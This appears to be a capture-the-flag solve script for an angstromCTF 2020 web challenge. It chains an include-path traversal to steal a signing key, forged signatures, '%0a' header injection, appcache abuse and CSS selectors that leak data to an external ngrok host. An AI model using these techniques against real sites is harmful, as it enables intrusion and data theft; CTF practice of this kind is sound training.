from Crypto.Cipher import PKCS1_OAEP
from Crypto.Hash import SHA256
from Crypto.PublicKey import RSA
import requests
import json

ubi = 'https://ubi.2020.chall.actf.co'
flags = 'https://flags.2020.chall.actf.co'
local = 'https://1e48639b.ngrok.io'

known = ''

d = requests.get(flags).text.split("/download/")[1].split("/flag")[0]
r = requests.post(ubi+'/build', data={'src': '#include "../'+d+'/config.json"', 'key': 'asdf'})
key = RSA.import_key(json.loads("{"+r.json()['message'].split(" {")[1].split("}")[0]+"}")["key"])

if len(known) < 16:
	style = ''.join('.tile:nth-child(4) a[href^="'+flags+'/download/'+known+hex(g)[2:].zfill(2)+'"]{background-image:url('+local+'/'+hex(g)[2:].zfill(2)+'.png);}' for g in range(0x100))
	css = requests.post(ubi+'/build', data={'src': style, 'key': key.export_key('PEM', pkcs=8)+b'\n'}).json()['message'][6:22]
	csig = PKCS1_OAEP.new(key).encrypt(SHA256.new(b'content-type: text/css\nx-ubi-src: 1\nx-ubi-id: '+css.encode('ascii')+b'\nx-ubi-key: '+SHA256.new(key.export_key('PEM', pkcs=8)+b'\n').hexdigest().encode('ascii')).digest()).hex()
	curl = '/download/'+css+'/flag?content-type=text/css&x-ubi-src=1&sig='+csig

	manifest = requests.post(ubi+'/build', data={'src': 'CACHE MANIFEST\nCACHE:\n/\nNETWORK:\n'+local+'\nCHROMIUM-INTERCEPT:\n/style.css return '+curl, 'key': key.export_key('PEM', pkcs=8)+b'\n'}).json()['message'][6:22]
	msig = PKCS1_OAEP.new(key).encrypt(SHA256.new(b'content-type: text/cache-manifest\nx-ubi-src: 1\nx-ubi-id: '+manifest.encode('ascii')+b'\nx-ubi-key: '+SHA256.new(key.export_key('PEM', pkcs=8)+b'\n').hexdigest().encode('ascii')).digest()).hex()
	murl = flags+'/download/'+manifest+'/flag?content-type=text/cache-manifest&x-ubi-src=1&sig='+msig

	i = requests.post(ubi+'/build', data={'src': '<html manifest="'+murl+'">', 'key': key.export_key('PEM', pkcs=8)+b'\n'}).json()['message'][6:22]
	sig = PKCS1_OAEP.new(key).encrypt(SHA256.new(b'content-type: text/html\nrefresh: 8; '+flags.encode('ascii')+b'\nx-appcache-allowed: /\nx-ubi-src: 1\nx-ubi-id: '+i.encode('ascii')+b'\nx-ubi-key: '+SHA256.new(key.export_key('PEM', pkcs=8)+b'\n').hexdigest().encode('ascii')).digest()).hex()
	url = flags+'/download/'+i+'/flag?content-type=text/html%0arefresh: 8; '+flags+'%0ax-appcache-allowed:%20/&x-ubi-src=1&sig='+sig
	print(url)
else:
	sig = PKCS1_OAEP.new(key).encrypt(SHA256.new(b'x-ubi-src: 1\nx-ubi-id: '+known.encode('ascii')+b'\nx-ubi-key: '+SHA256.new(key.export_key('PEM', pkcs=8)+b'\n').hexdigest().encode('ascii')).digest()).hex()
	url = flags+'/download/'+known+'/flag?x-ubi-src=1&sig='+sig
	print(requests.get(url, headers={'referer': flags+'/'}).text)
